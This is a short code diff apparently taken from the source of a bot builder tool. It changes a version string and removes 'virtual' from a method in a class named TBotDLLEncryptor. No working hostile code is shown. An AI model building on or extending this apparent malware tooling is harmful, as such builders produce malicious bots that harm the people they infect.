@@ -14,7 +14,7 @@
 // Версия сборщика
 #define BUILDER_VERSION 1
 
-#define BUILDER_APP_VERSION "2.2"
+#define BUILDER_APP_VERSION "2.2.1"
 
 
 
@@ -407,7 +407,7 @@ protected:
 public:
 	TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWORD ASize);
 
-    bool virtual CheckParam(LPBYTE Buf, LPBYTE OriginalBuf);
+    bool CheckParam(LPBYTE Buf, LPBYTE OriginalBuf);
 };
 
 
